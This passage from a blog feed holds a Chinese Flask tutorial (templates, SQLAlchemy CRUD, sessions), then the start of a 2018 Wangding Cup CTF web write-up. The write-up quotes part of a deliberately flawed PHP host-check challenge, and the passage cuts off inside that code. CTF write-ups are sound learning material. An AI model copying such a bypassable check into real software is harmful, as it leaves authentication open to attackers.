href="#Flask渲染jinja2模板和传参" class="headerlink" title="Flask渲染jinja2模板和传参"></a>Flask渲染jinja2模板和传参</h2><h3 id="渲染模板"><a href="#渲染模板" class="headerlink" title="渲染模板"></a>渲染模板</h3><p>1.模板放在templates文件夹下</p><p>2.从flask中导入render_template函数</p><p>3.在视图函数中，使用render_template函数，渲染模板。注意：只需要填写模板的名字，不需要填写templates文件夹</p><h3 id="模板传参"><a href="#模板传参" class="headerlink" title="模板传参"></a>模板传参</h3><p>1.如果只有一个或者少量参数，直接在render_template函数中添加关键字就可以了</p><p>2.如果有多个参数的时候，那么可以先把所有的参数放在字典中，然后在render_template中，使用两个星号，把字典转换成关键参数传递进去，这样代码更方便管理和使用</p><p>3.在模板中，如果要使用一个变量，语法是：</p><p>例子：</p><p>index.html中内容</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>渲染模板代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">u'知了课堂'</span>,</span><br><span class="line">        <span class="string">'gender'</span>:<span class="string">u'男'</span>,</span><br><span class="line">        <span class="string">'age'</span>:<span class="number">18</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,**context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><h2 id="模板中访问属性和字典"><a href="#模板中访问属性和字典" class="headerlink" title="模板中访问属性和字典"></a>模板中访问属性和字典</h2><p>访问模型中的属性或者是字典，可以通过的形式，或者是使用</p><p>例子：</p><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">这是HTML文件中出现的文字</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>用户名:&#123;&#123; username &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>性别：&#123;&#123; gender &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>年龄：&#123;&#123; age &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>名字：&#123;&#123; person.name &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>年龄：&#123;&#123; person.age &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>百度：&#123;&#123; websites.baidu &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>谷歌：&#123;&#123; websites.google &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Person</span><span class="params">(object)</span>:</span></span><br><span class="line">        name = <span class="string">'somnus'</span></span><br><span class="line">        age = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">    p = Person()</span><br><span class="line"></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'somnus'</span>,</span><br><span class="line">        <span class="string">'gender'</span>:<span class="string">u'男'</span>,</span><br><span class="line">        <span class="string">'age'</span>:<span class="number">18</span>,</span><br><span class="line">        <span class="string">'person'</span>:p,</span><br><span class="line">        <span class="string">'websites'</span>:&#123;</span><br><span class="line">            <span class="string">'baidu'</span>:<span class="string">'www.baidu.com'</span>,</span><br><span class="line">            <span class="string">'google'</span>:<span class="string">'www.google.com'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,**context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="if判断"><a href="#if判断" class="headerlink" title="if判断"></a>if判断</h2><p>1.语法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if 判断条件 %&#125;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>2.if的使用，可以和python中相差无几</p><p>3.例子</p><p>if.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if user %&#125;</span><br><span class="line">    &lt;a href=&quot;#&quot;&gt;&#123;&#123; user.username &#125;&#125;&lt;/a&gt;</span><br><span class="line">    &lt;a href=&quot;#&quot;&gt;注销&lt;/a&gt;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">    &lt;a href=&quot;#&quot;&gt;登录&lt;/a&gt;</span><br><span class="line">    &lt;a href=&quot;#&quot;&gt;注册&lt;/a&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/&lt;is_login&gt;/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(is_login)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_login == <span class="string">'1'</span>:</span><br><span class="line">        user = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">'somnus'</span>,</span><br><span class="line">            <span class="string">'age'</span>:<span class="number">18</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'if.html'</span>,user=user)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'if.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><h2 id="for循环遍历列表和字典"><a href="#for循环遍历列表和字典" class="headerlink" title="for循环遍历列表和字典"></a>for循环遍历列表和字典</h2><p>1.字典的遍历，语法和python一样，可以使用items(),keys(),values(),iteritems(),iterkeys(),itervalues()</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for k,v in user.items() %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; k &#125;&#125;:&#123;&#123; v &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>2.例子</p><p>for.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for k,v in user.items() %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; k &#125;&#125;:&#123;&#123; v &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    user = &#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'somnus'</span>,</span><br><span class="line">        <span class="string">'age'</span>:<span class="number">18</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'for.html'</span>,user=user)</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>3.列表的遍历：语法和python一样</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for list in lists %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; website &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>1.介绍和语法：</p><p>(1)介绍：过滤器可以处理变量，把原始的变量经过处理后再展示出来</p><p>(2)语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; avatar|default(&apos;xxx&apos;) &#125;&#125;</span><br></pre></td></tr></table></figure><p>2.default过滤器：如果当前变量不存在，这时候可以指定默认值</p><p>3.length过滤器：求列表或者字符串或者字典或者元组的长度</p><h2 id="继承和block"><a href="#继承和block" class="headerlink" title="继承和block"></a>继承和block</h2><p>1.继承的作用和语法：</p><p>(1)作用：可以把一些公共的代码放在父模板中，避免每个模板写同样的代码</p><p>(2)语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &apos;base.html&apos; %&#125;</span><br></pre></td></tr></table></figure><p>2.block实现：</p><p>(1)作用：可以让子模板实现自己的一些需求，父模板需要提前定义好</p><p>(2)注意点：子模板中的代码，必须放在block块中</p><p>3.例子</p><p>模板base.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">这是一个模板</span><br><span class="line">&#123;% block main %&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>继承block.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% block main %&#125;</span><br><span class="line">    这是一个子模板</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h2 id="url链接"><a href="#url链接" class="headerlink" title="url链接"></a>url链接</h2><p>使用url_for(视图函数名称)可以反转成url</p><h2 id="加载静态文件"><a href="#加载静态文件" class="headerlink" title="加载静态文件"></a>加载静态文件</h2><p>1.语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for(&apos;static&apos;,filename=&apos;路径&apos;)</span><br></pre></td></tr></table></figure><p>2.静态文件，flask会从static文件夹开始寻找，所以不用再写static这个路径</p><p>3.可以加载css文件，可以加载js文件，还有image文件</p><h2 id="Mysql-python中间件安装"><a href="#Mysql-python中间件安装" class="headerlink" title="Mysql-python中间件安装"></a>Mysql-python中间件安装</h2><p><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#mysql-python" target="_blank" rel="noopener">https://www.lfd.uci.edu/~gohlke/pythonlibs/#mysql-python</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/flask/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="flask-sqlalchemy安装与使用"><a href="#flask-sqlalchemy安装与使用" class="headerlink" title="flask-sqlalchemy安装与使用"></a>flask-sqlalchemy安装与使用</h2><p>1.安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask-sqlalchemy</span><br></pre></td></tr></table></figure><p>2.使用</p><p>(1)使用flask_sqlalchemy中的SQLAlchemy进行初始化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">db = SQLAlchemy(app)</span><br></pre></td></tr></table></figure><p>(2)设置配置信息：在config.py文件中添加以下配置信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dialect+driver://username:password@host:port/database</span></span><br><span class="line">DIALECT = <span class="string">'mysql'</span></span><br><span class="line">DRIVER = <span class="string">'mysqldb'</span></span><br><span class="line">USERNAME = <span class="string">'root'</span></span><br><span class="line">PASSWORD = <span class="string">'root'</span></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="string">'3306'</span></span><br><span class="line">DATABASE = <span class="string">'db_demo1'</span></span><br><span class="line"></span><br><span class="line">SQLALCHEMY_DATABASE_URI = <span class="string">"&#123;&#125;+&#123;&#125;://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;/&#123;&#125;?charset=utf8"</span>.format(DIALECT,DRIVER,USERNAME,PASSWORD,HOST,PORT,DATABASE)</span><br><span class="line">SQLALCHEMY_TRACK_MODIFICATIONS = <span class="keyword">False</span></span><br></pre></td></tr></table></figure><p>(3)在主app文件中，添加配置文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(config)</span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line">db.create_all()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>(4)测试有没有问题报错，如无，则成功连接</p><h2 id="使用Flask-SQLAlchemy创建模型与表的映射"><a href="#使用Flask-SQLAlchemy创建模型与表的映射" class="headerlink" title="使用Flask-SQLAlchemy创建模型与表的映射"></a>使用Flask-SQLAlchemy创建模型与表的映射</h2><p>1.模型需要继承自db.Model，然后需要映射到表中的属性，必须写成’db.Column’的数据类型</p><p>2.数据类型：db.Integer代表的是整型，db.String代表的是varchar，需要指定最长的长度，db.Text代表的是text</p><p>3.其他参数：primary_key代表的是将这个字段设置为主键，autoincrement代表的是这个主键为自增长的，nullable代表的是这个字段是否可以为空，可以将这个值设置为False，在数据库中，这个值就不能为空了</p><p>4.最后需要调用db.create_all来将模型真正创建到数据库中</p><p>例子：</p><p>config.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DIALECT = <span class="string">'mysql'</span></span><br><span class="line">DRIVER = <span class="string">'mysqldb'</span></span><br><span class="line">USERNAME = <span class="string">'root'</span></span><br><span class="line">PASSWORD = <span class="string">'root'</span></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="string">'3306'</span></span><br><span class="line">DATABASE = <span class="string">'db_demo2'</span></span><br><span class="line"></span><br><span class="line">SQLALCHEMY_DATABASE_URI = <span class="string">"&#123;&#125;+&#123;&#125;://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;/&#123;&#125;?charset=utf8"</span>.format(DIALECT,DRIVER,USERNAME,PASSWORD,HOST,PORT,DATABASE)</span><br><span class="line">SQLALCHEMY_TRACK_MODIFICATIONS = <span class="keyword">False</span></span><br></pre></td></tr></table></figure><p>创建table执行的sql语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> article(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span> auto_increment,</span><br><span class="line">    title <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">content</span> <span class="built_in">text</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>db_demo2.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(config)</span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Article</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'article'</span></span><br><span class="line">    id = db.Column(db.Integer,primary_key=<span class="keyword">True</span>,autoincrement=<span class="keyword">True</span>)</span><br><span class="line">    title = db.Column(db.String(<span class="number">100</span>),nullable=<span class="keyword">False</span>)</span><br><span class="line">    content = db.Column(db.Text,nullable=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">db.create_all()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'index'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><h2 id="Flask-SQLAlchemy数据的增，删，改，查"><a href="#Flask-SQLAlchemy数据的增，删，改，查" class="headerlink" title="Flask-SQLAlchemy数据的增，删，改，查"></a>Flask-SQLAlchemy数据的增，删，改，查</h2><p>1.增：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">article1 = Article(title=<span class="string">'aaa'</span>,content=<span class="string">'bbb'</span>)</span><br><span class="line">db.session.add(article1)</span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure><p>2.查：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">article1 = Article.query.filter(Article.title == <span class="string">'aaa'</span>).first()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'title:%s'</span> % article1.title</span><br><span class="line"><span class="keyword">print</span> <span class="string">'content:%s'</span> % article1.content</span><br></pre></td></tr></table></figure><p>3.改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先把你要更改的数据查找出来</span></span><br><span class="line">article1 = Article.query.filter(Article.title == <span class="string">'aaa'</span>).first()</span><br><span class="line"><span class="comment"># 把这条数据进行修改</span></span><br><span class="line">article1.title = <span class="string">'new title'</span></span><br><span class="line"><span class="comment"># 做事务的提交</span></span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure><p>4.删：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把需要删除的数据查找出来</span></span><br><span class="line">article1 = Article.query.filter(Article.content == <span class="string">'bbb'</span>).first()</span><br><span class="line"><span class="comment"># 把这条数据删除掉</span></span><br><span class="line">db.session.delete(article1)</span><br><span class="line"><span class="comment"># 做事务的提交</span></span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure><h2 id="flask中的session工作机制"><a href="#flask中的session工作机制" class="headerlink" title="flask中的session工作机制"></a>flask中的session工作机制</h2><p>1.flask中的session机制是：把敏感数据经过加密后放入session中，然后再把session存放到cookie中，下次请求的时候，再把浏览器发送过来的cookie中读取session，然后再从session中读取敏感数据，并进行解密，获取最终的用户数据</p><p>2.flask的这种session机制，可以节省服务器的开销，因为把所有的信息都存储到了客户端（浏览器）</p><p>3.安全是相对的，把session放到cookie中，经过加密，也是比较安全的</p><h2 id="flask操作session"><a href="#flask操作session" class="headerlink" title="flask操作session"></a>flask操作session</h2><p>1.session的操作方式：</p><p>(1)使用session需要从flask中导入session，以后和session相关的操作都是通过这个变量来的</p><p>(2)使用session需要设置SECRET_KEY，作为加密用的，并且这个SECRET_KEY，如果每次服务器启动后都变化的话，那么之前的session就不能再通过当前这个SECRET_KEY就不能再进行解密了</p><p>(3)操作session的时候，跟操作字典是一样的</p><p>(4)添加session：session[‘username’]</p>]]></content>
    
    <summary type="html">
    
      Python
    
    </summary>
    
      <category term="Python" scheme="https://Foxgrin.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://Foxgrin.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯第三场Web</title>
    <link href="https://Foxgrin.github.io//posts/25445/"/>
    <id>https://Foxgrin.github.io//posts/25445/</id>
    <published>2018-09-04T10:45:00.000Z</published>
    <updated>2018-09-04T13:24:41.598Z</updated>
    
    <content type="html"><![CDATA[<p>2018年网鼎杯第三场Web题解<a id="more"></a></p><h3 id="comein"><a href="#comein" class="headerlink" title="comein"></a>comein</h3><p>题目：由于运维人员失误，内网认证页面部署至了外网，不过还好，开发加了域名验证。 </p><p>做的时候服务器已经关闭了，获取源代码本地测试(PS:文件名为index.php，文件放在根目录下，浏览器输入localhost访问)</p><p>源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>,<span class="number">0</span>);</span><br><span class="line">$uri = $_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($uri,<span class="string">"."</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Unknow URI."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!parse_url($uri,PHP_URL_HOST))&#123;</span><br><span 